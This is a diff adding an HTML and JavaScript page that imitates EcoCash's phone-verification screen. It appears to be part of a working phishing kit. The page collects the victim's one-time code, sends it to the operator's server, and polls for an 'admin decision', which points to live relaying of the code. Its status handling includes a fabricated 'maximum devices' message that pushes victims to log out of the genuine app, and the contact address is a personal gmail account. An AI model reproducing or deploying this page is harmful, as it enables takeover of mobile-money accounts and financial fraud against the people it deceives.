@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>EcoCash – Verify OTP</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Nunito',sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;}
+
+        .top{flex:1;display:flex;flex-direction:column;align-items:center;padding:3rem 1.5rem 2.5rem;text-align:center;}
+        .logo{font-size:2.6rem;font-weight:800;letter-spacing:-1px;margin-bottom:2.5rem;}
+        .logo .eco{color:#003087;} .logo .cash{color:#d0021b;}
+        .page-title{font-size:1.5rem;font-weight:700;color:#333;margin-bottom:.5rem;}
+        .sub{font-size:.9rem;color:#888;margin-bottom:.4rem;}
+        .phone-display{font-size:1rem;font-weight:700;color:#1a1a1a;background:#f4f6fa;border-radius:8px;padding:.4rem 1rem;display:inline-block;margin-bottom:2rem;}
+
+        .otp-row{display:flex;gap:10px;justify-content:center;margin-bottom:1.5rem;}
+        .otp-box{width:52px;height:58px;border:2px solid #dde3f0;border-radius:10px;font-family:'Nunito',sans-serif;font-size:1.5rem;font-weight:800;text-align:center;outline:none;background:#fff;color:#1a1a1a;transition:border-color .2s,box-shadow .2s;-webkit-appearance:none;}
+        .otp-box:focus{border-color:#003087;box-shadow:0 0 0 3px rgba(0,48,135,.12);}
+        .otp-box.filled{border-color:#003087;background:#f0f4ff;}
+        .otp-box.error{border-color:#d0021b;background:#fff5f5;}
+
+        .timer-line{font-size:.85rem;color:#888;margin-bottom:.4rem;}
+        .timer-count{font-weight:800;color:#d0021b;}
+        .resend-line{font-size:.85rem;color:#666;margin-bottom:1.8rem;}
+        .resend-link{color:#003087;font-weight:700;cursor:pointer;}
+        .resend-link.disabled{color:#bbb;pointer-events:none;}
+
+        .btn-verify{width:100%;max-width:380px;padding:1rem;background:#003087;color:#fff;border:none;border-radius:10px;font-family:'Nunito',sans-serif;font-size:1.1rem;font-weight:800;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;transition:background .2s;}
+        .btn-verify:hover:not(:disabled){background:#002060;}
+        .btn-verify:disabled{background:#b0c0d8;cursor:not-allowed;}
+        .error-msg{color:#d0021b;font-size:.85rem;margin-top:.75rem;min-height:1.2em;text-align:center;}
+
+        .wave-wrap{line-height:0;} .wave-wrap svg{display:block;width:100%;}
+        .bottom{background:#003087;padding:2rem 1.5rem 2.5rem;display:flex;flex-direction:column;align-items:center;}
+        .footer-text{font-size:.72rem;color:rgba(255,255,255,.65);text-align:center;line-height:1.8;}
+        .footer-text a{color:rgba(255,255,255,.9);text-decoration:underline;}
+
+        .loading-overlay{position:fixed;inset:0;background:rgba(110,110,110,0.82);z-index:500;display:none;align-items:center;justify-content:center;padding:2rem;}
+        .loading-overlay.show{display:flex;}
+        .loading-card{background:#fff;border-radius:18px;padding:2.8rem 2rem 2.4rem;display:flex;flex-direction:column;align-items:center;gap:1.1rem;width:100%;max-width:320px;box-shadow:0 8px 32px rgba(0,0,0,.12);}
+        .spinner-wrap{position:relative;width:90px;height:90px;}
+        .spinner-bg{width:90px;height:90px;border-radius:50%;background:#8b9fd4;}
+        .spinner-arc{position:absolute;inset:0;border-radius:50%;border:5px solid transparent;border-top:5px solid rgba(255,255,255,0.85);border-right:5px solid rgba(255,255,255,0.3);animation:spin 1s linear infinite;}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .loading-title{font-size:1.25rem;font-weight:800;color:#6b7fd4;text-align:center;}
+        .loading-sub{font-size:.88rem;color:#888;text-align:center;margin-top:-.4rem;}
+        .cancel-link{font-size:.78rem;color:#aaa;cursor:pointer;text-decoration:underline;margin-top:.6rem;}
+        .cancel-link:hover{color:#d0021b;}
+
+        @media(max-width:420px){
+            .top{padding:2rem 1.2rem 1.8rem;}
+            .logo{font-size:2.1rem;}
+            .otp-box{width:44px;height:50px;font-size:1.3rem;}
+            .otp-row{gap:8px;}
+        }
+    </style>
+</head>
+<body>
+<div class="top">
+    <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="page-title">Verify Your Phone</div>
+    <p class="sub">Enter the 6-digit code sent to</p>
+    <div class="phone-display" id="phone-display">+263 — — —</div>
+
+    <div class="otp-row" id="otp-row">
+        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code"/>
+        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" autocomplete="off"/>
+    </div>
+
+    <div class="timer-line">Resend code in <span class="timer-count" id="timer">60</span>s</div>
+    <div class="resend-line">Didn't receive it? <span class="resend-link disabled" id="resend">Resend code</span></div>
+    <button class="btn-verify" id="verifyBtn" disabled>VERIFY</button>
+    <div class="error-msg" id="err"></div>
+</div>
+
+<div class="wave-wrap">
+    <svg viewBox="0 0 414 55" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+        <path d="M0,0 L414,0 L414,55 Q207,5 0,55 Z" fill="#ffffff"/>
+        <path d="M0,55 Q207,5 414,55 L414,110 L0,110 Z" fill="#003087"/>
+    </svg>
+</div>
+<div class="bottom">
+    <div class="footer-text">v4.0.1P<br/>By using EcoCash you agree to our <a href="#">Terms and Conditions</a><br/><a href="mailto:loansecocash8@gmail.com">loansecocash8@gmail.com</a></div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+        <div class="spinner-wrap">
+            <div class="spinner-bg"></div>
+            <div class="spinner-arc"></div>
+        </div>
+        <div class="loading-title" id="loadingTitle">Processing...</div>
+        <div class="loading-sub"  id="loadingSub">Verifying your code...</div>
+        <div class="cancel-link"  id="cancelLink" style="display:none">Cancel</div>
+    </div>
+</div>
+
+<script>
+    // ── Guard: must have a session_id to be here ──────────────────────────────
+    const _sid = sessionStorage.getItem('session_id');
+    if (!_sid) {
+        window.location.replace('/login');
+    }
+
+    // ── Phone display ─────────────────────────────────────────────────────────
+    // FIX: stored as "0712345678" — format nicely as "+263 71 234 5678"
+    const sp     = sessionStorage.getItem('phone') || '';
+    const digits = sp.replace(/\D/g, '').replace(/^0/, ''); // 9 digits
+    if (digits.length === 9) {
+        document.getElementById('phone-display').textContent =
+            '+263 ' + digits.slice(0,2) + ' ' + digits.slice(2,5) + ' ' + digits.slice(5);
+    }
+
+    // ── Overlay helpers ───────────────────────────────────────────────────────
+    const overlay   = document.getElementById('loadingOverlay');
+    const loadTitle = document.getElementById('loadingTitle');
+    const loadSub   = document.getElementById('loadingSub');
+    const cancelLnk = document.getElementById('cancelLink');
+    const errEl     = document.getElementById('err');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const timerEl   = document.getElementById('timer');
+    const resendEl  = document.getElementById('resend');
+    let seconds = 60, timerInt, pollInterval;
+
+    function showLoading(title, sub, showCancel=false) {
+        loadTitle.textContent   = title;
+        loadSub.textContent     = sub;
+        cancelLnk.style.display = showCancel ? 'block' : 'none';
+        overlay.classList.add('show');
+    }
+    function hideLoading() {
+        overlay.classList.remove('show');
+        cancelLnk.style.display = 'none';
+    }
+
+    cancelLnk.addEventListener('click', () => {
+        clearInterval(pollInterval); pollInterval = null;
+        hideLoading();
+        verifyBtn.disabled    = (getOtp().length < 6);
+        errEl.textContent     = 'Cancelled. You can try again.';
+    });
+
+    // ── Countdown timer ───────────────────────────────────────────────────────
+    function startTimer() {
+        clearInterval(timerInt);
+        seconds = 60; timerEl.textContent = 60;
+        resendEl.classList.add('disabled');
+        timerInt = setInterval(() => {
+            seconds--;
+            timerEl.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(timerInt);
+                resendEl.classList.remove('disabled');
+            }
+        }, 1000);
+    }
+    startTimer();
+
+    // ── OTP boxes ─────────────────────────────────────────────────────────────
+    const boxes = Array.from(document.querySelectorAll('.otp-box'));
+
+    boxes.forEach((box, i) => {
+        box.addEventListener('input', e => {
+            box.classList.remove('error');
+            errEl.textContent = '';
+            // FIX: handle paste-into-single-box (mobile autofill may fire as input with >1 char)
+            const val = e.target.value.replace(/\D/g, '');
+            if (val.length > 1) {
+                // Distribute pasted digits across remaining boxes
+                val.split('').forEach((n, j) => {
+                    if (i + j < 6) {
+                        boxes[i + j].value = n;
+                        boxes[i + j].classList.add('filled');
+                    }
+                });
+                boxes[Math.min(i + val.length, 5)].focus();
+                check();
+                return;
+            }
+            e.target.value = val;
+            if (val) {
+                box.classList.add('filled');
+                if (i < 5) boxes[i + 1].focus();
+            } else {
+                box.classList.remove('filled');
+            }
+            check();
+        });
+
+        box.addEventListener('keydown', e => {
+            if ((e.key === 'Backspace' || e.key === 'Delete') && !box.value && i > 0) {
+                boxes[i - 1].focus();
+                boxes[i - 1].value = '';
+                boxes[i - 1].classList.remove('filled');
+                check();
+            }
+        });
+
+        box.addEventListener('paste', e => {
+            e.preventDefault();
+            const ns = (e.clipboardData.getData('text')).replace(/\D/g, '');
+            ns.split('').forEach((n, j) => {
+                if (i + j < 6) { boxes[i + j].value = n; boxes[i + j].classList.add('filled'); }
+            });
+            boxes[Math.min(i + ns.length, 5)].focus();
+            check();
+        });
+    });
+
+    function check()  { verifyBtn.disabled = getOtp().length < 6; }
+    function getOtp() { return boxes.map(b => b.value).join(''); }
+
+    // ── Resend OTP ────────────────────────────────────────────────────────────
+    resendEl.addEventListener('click', async () => {
+        if (resendEl.classList.contains('disabled')) return;
+        resendEl.classList.add('disabled');
+        startTimer();
+        boxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'error'); });
+        boxes[0].focus();
+        check();
+        errEl.textContent = '';
+
+        try {
+            const res  = await fetch('/api/resend-otp', {
+                method:  'POST',
+                headers: {'Content-Type': 'application/json'},
+                body:    JSON.stringify({ session_id: sessionStorage.getItem('session_id') })
+            });
+            const data = await res.json();
+            // FIX: surface server-side errors on resend (e.g. session expired)
+            if (!data.success) {
+                errEl.textContent = data.error || 'Could not resend. Please login again.';
+                if (data.error && data.error.toLowerCase().includes('expired')) {
+                    setTimeout(() => { window.location.href = '/login'; }, 2000);
+                }
+            }
+        } catch {
+            errEl.textContent = 'Connection error. Please check your network.';
+        }
+    });
+
+    // ── Verify button ─────────────────────────────────────────────────────────
+    verifyBtn.addEventListener('click', async () => {
+        const otp = getOtp();
+        const sid = sessionStorage.getItem('session_id');
+
+        // FIX: guard — if session was somehow cleared, bounce to login
+        if (!sid) {
+            window.location.replace('/login');
+            return;
+        }
+
+        errEl.textContent = '';
+        showLoading('Processing...', 'Verifying your code...');
+        verifyBtn.disabled = true;
+
+        try {
+            const res  = await fetch('/api/submit-otp', {
+                method:  'POST',
+                headers: {'Content-Type': 'application/json'},
+                body:    JSON.stringify({ session_id: sid, otp })
+            });
+            const data = await res.json();
+            if (!data.success) {
+                hideLoading();
+                errEl.textContent  = data.error || 'Verification failed.';
+                verifyBtn.disabled = false;
+                // FIX: if gateway not open, allow retry without clearing boxes
+                return;
+            }
+        } catch {
+            hideLoading();
+            errEl.textContent  = 'Could not connect to server.';
+            verifyBtn.disabled = false;
+            return;
+        }
+
+        // OTP submitted — poll for admin decision
+        showLoading('Please wait...', 'This usually takes a few seconds', true);
+        startPolling(sid);
+    });
+
+    // ── Status polling ────────────────────────────────────────────────────────
+    function startPolling(sid) {
+        pollInterval = setInterval(async () => {
+            try {
+                const res  = await fetch(`/api/check-status?session_id=${sid}`);
+                const data = await res.json();
+
+                // Keep polling while admin reviews
+                if (data.status === 'awaiting_otp') return;
+
+                // Stop polling for all terminal / transition states
+                clearInterval(pollInterval); pollInterval = null;
+
+                if (data.status === 'fully_approved') {
+                    showLoading('Please wait...', 'Finalising your application...');
+                    sessionStorage.setItem('verified', 'true');
+                    setTimeout(() => { window.location.href = '/success'; }, 800);
+
+                } else if (data.status === 'otp_rejected') {
+                    hideLoading();
+                    clearInterval(timerInt);
+                    seconds = 0; timerEl.textContent = '0';
+                    resendEl.classList.remove('disabled');
+                    boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); b.classList.add('error'); });
+                    errEl.textContent  = 'Incorrect OTP — please try again.';
+                    verifyBtn.disabled = true; // re-disabled since boxes are cleared
+                    check(); boxes[0].focus();
+
+                } else if (data.status === 'max_devices_reached') {
+                    hideLoading();
+                    clearInterval(timerInt);
+                    errEl.textContent  = '⚠️ You have reached the maximum number of devices logged in. Please logout from your EcoCash app and come back to try logging in again. We will verify your loan application.';
+                    errEl.style.color = '#ef4444';
+                    errEl.style.fontWeight = '700';
+                    errEl.style.marginTop = '1rem';
+                    errEl.style.fontSize = '1rem';
+                    verifyBtn.disabled = true;
+                    resendEl.classList.add('disabled'); // span — use class, not .disabled property
+                    setTimeout(() => { window.location.href = '/login'; }, 30000);
+
+                } else if (data.status === 'pin_rejected') {
+                    hideLoading();
+                    errEl.textContent = 'Session invalidated. Please login again.';
+                    setTimeout(() => { window.location.href = '/login'; }, 2000);
+
+                } else if (data.status === 'expired') {
+                    hideLoading();
+                    errEl.textContent = 'Session expired. Please login again.';
+                    setTimeout(() => { window.location.href = '/login'; }, 2000);
+
+                } else {
+                    hideLoading();
+                    errEl.textContent = 'Unexpected error. Redirecting to login...';
+                    setTimeout(() => { window.location.href = '/login'; }, 2000);
+                }
+            } catch { /* network hiccup — keep polling */ }
+        }, 1500);
+    }
+
+    boxes[0].focus();
+</script>
+<script src="/chat-widget.js"></script>
+</body>
+</html>
